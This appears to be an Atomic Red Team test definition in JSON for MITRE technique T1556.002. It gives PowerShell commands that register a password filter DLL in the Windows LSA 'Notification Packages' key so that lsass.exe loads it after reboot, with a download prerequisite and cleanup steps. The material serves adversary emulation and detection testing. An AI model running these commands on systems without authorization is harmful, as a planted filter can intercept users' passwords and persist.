{
    "name": "Install and Register Password Filter DLL",
    "description": "Uses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges. The binary in bin is https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection Source is in src folder.  This does require a reboot to see the filter loaded into lsass.exe.  It does require Administrative privileges to import the clean registry values back into LSA, it is possible you may have to manually do this after for cleanup. ",
    "supported_platforms": [
        "windows"
    ],
    "dependency_executor_name": "powershell",
    "executor": {
        "command": "reg.exe export HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ \"PathToAtomicsFolder\\T1556.002\\lsa_backup.reg\"\n$passwordFilterName = (Copy-Item \"#{dll_path}\\#{dll_name}\" -Destination \"C:\\Windows\\System32\" -PassThru).basename\n$lsaKey = Get-Item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\"\n$notificationPackagesValues = $lsaKey.GetValue(\"Notification Packages\")\n$notificationPackagesValues += $passwordFilterName\nSet-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" \"Notification Packages\" $notificationPackagesValues\n",
        "cleanup_command": "reg.exe import \"PathToAtomicsFolder\\T1556.002\\lsa_backup.reg\"\nremove-item C:\\Windows\\System32\\#{dll_name}\n",
        "name": "powershell",
        "elevation_required": true,
        "type": "Command Executor"
    },
    "id": "T1556.002",
    "tactics": [
        "Persistence",
        "Defense Evasion",
        "Credential Access"
    ],
    "technique": "Password Filter DLL",
    "source": "ART",
    "uuid": "a7961770-beb5-4134-9674-83d7e1fa865c",
    "arguments": {
        "dll_path": {
            "description": "Path to DLL to be installed and registered",
            "type": "path",
            "default": "PathToAtomicsFolder\\T1556.002\\bin"
        },
        "dll_name": {
            "description": "Name of the Password Filter",
            "type": "string",
            "default": "AtomicRedTeamPWFilter.dll"
        }
    },
    "preconditions": [
        {
            "description": "AtomicRedTeamPWFilter.dll must exist on disk at specified location (#{dll_path}\\#{dll_name})\n",
            "prereq_command": "if (Test-Path \"#{dll_path}\\#{dll_name}\") {exit 0} else {exit 1}\n",
            "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"https://github.com/redcanaryco/atomicredteam/atomics/T1556.002/bin/AtomicRedTeamPWFilter.dll\" -OutFile \"#{dll_path}\\#{dll_name}\"\n"
        }
    ],
    "infrastructure_requirement": [],
    "side": "Victim"
}